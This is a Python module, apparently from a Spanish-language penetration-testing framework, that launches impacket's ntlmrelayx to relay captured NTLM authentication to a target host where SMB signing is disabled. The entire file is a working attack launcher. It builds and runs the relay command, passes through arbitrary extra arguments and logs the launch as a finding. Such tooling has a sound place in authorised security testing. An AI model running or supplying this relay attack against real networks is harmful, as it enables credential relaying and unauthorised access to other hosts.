
# scripts/smb/attack/ntlm_relay.py
"""
Helper de configuración de NTLM relay.
Lanza ntlmrelayx.py de impacket apuntando al host especificado.
Lobera actúa como lanzador/wrapper, no como el relay en sí.
"""
import subprocess
import shutil
from core.output import console, print_result
from core import session_db
from scripts.base import BaseScript


class Script(BaseScript):
    name        = "ntlm-relay"
    protocol    = "smb"
    category    = "attack"
    description = (
        "Lanza ntlmrelayx (impacket) para hacer relay de autenticación NTLM capturada a un objetivo. "
        "Requiere ntlmrelayx.py en el PATH y SMB signing deshabilitado en el objetivo."
    )

    def run(self, **kwargs):
        ip          = self.target.ip
        relay_target= str(kwargs.get("relay_target", ip))
        mode        = str(kwargs.get("mode", "smb"))
        extra_args  = str(kwargs.get("extra_args", ""))

        ntlmrelayx = shutil.which("ntlmrelayx.py") or shutil.which("ntlmrelayx")
        if not ntlmrelayx:
            console.print("[red]ntlmrelayx.py no encontrado en el PATH.[/red]")
            console.print("[dim]Instala impacket: pip install impacket[/dim]")
            return None

        cmd = [ntlmrelayx, "-t", f"{mode}://{relay_target}", "-smb2support"]
        if extra_args:
            cmd += extra_args.split()

        console.print(f"\n[bold green]Lanzando:[/bold green] {' '.join(cmd)}")
        console.print("[dim]Pulsa Ctrl+C para detener el relay.[/dim]\n")

        session_db.DB.SaveFinding(ip, "SMB", "ntlm_relay_launched",
                                   f"relay_target={relay_target} mode={mode}")
        try:
            subprocess.run(cmd)
        except KeyboardInterrupt:
            console.print("\n[dim]Relay detenido.[/dim]")
        except Exception as e:
            print_result("SMB", ip, "fail", f"ntlmrelayx falló: {e}")
            return None
        return True
